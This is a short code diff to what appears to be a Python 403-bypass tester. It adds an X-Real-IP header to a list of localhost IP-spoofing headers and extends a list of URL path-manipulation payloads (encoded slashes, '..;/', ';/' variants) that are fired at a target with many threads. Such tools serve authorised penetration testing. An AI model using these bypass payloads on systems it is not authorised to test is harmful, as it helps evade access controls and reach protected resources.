@@ -20,6 +20,7 @@ def random_user_agent():
 BYPASS_HEADERS = [
     {"X-Forwarded-For": "127.0.0.1"},
     {"X-Originating-IP": "127.0.0.1"},
+    {"X-Real-IP": "127.0.0.1"},
     {"X-Remote-IP": "127.0.0.1"},
     {"X-Remote-Addr": "127.0.0.1"},
     {"X-ProxyUser-Ip": "127.0.0.1"},
@@ -34,9 +35,9 @@ BYPASS_HEADERS = [
 HTTP_METHODS = ["GET", "POST", "PUT", "HEAD", "PATCH", "TRACE"]
 
 PATH_TECHNIQUES = [
-    "{}", "%2e/{}", "{}/.", "/{}//", "./{}/./",
+    "{}", "%2e/{}", "%2f{}/", "%2f{}%2f", "./{}/","{}/.", "/{}/./","/{}//", "./{}/./",
     "{}?", "{}.html", "{}#", "{}..;/", "{};/",
-    "//{}///", "{} ".upper(), "*/{}", "/{}", "{}../", "{}/*"
+    "//{}///", "{}/ ".upper(), "*{}/", "/{}", "/{}//", "{}../", "{}/*", ";/{}/", "/;//{}/"
 ]
 
 def load_wordlist(wordlist_file):
@@ -133,7 +134,7 @@ def run_tests(target_url, path, threads=20, verbose=False):
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = []
             for technique in PATH_TECHNIQUES:
-                if technique == "{} ".upper():
+                if technique == "{}/ ".upper():
                     modified_path = technique.format(effective_path.upper())
                 else:
                     modified_path = technique.format(effective_path)
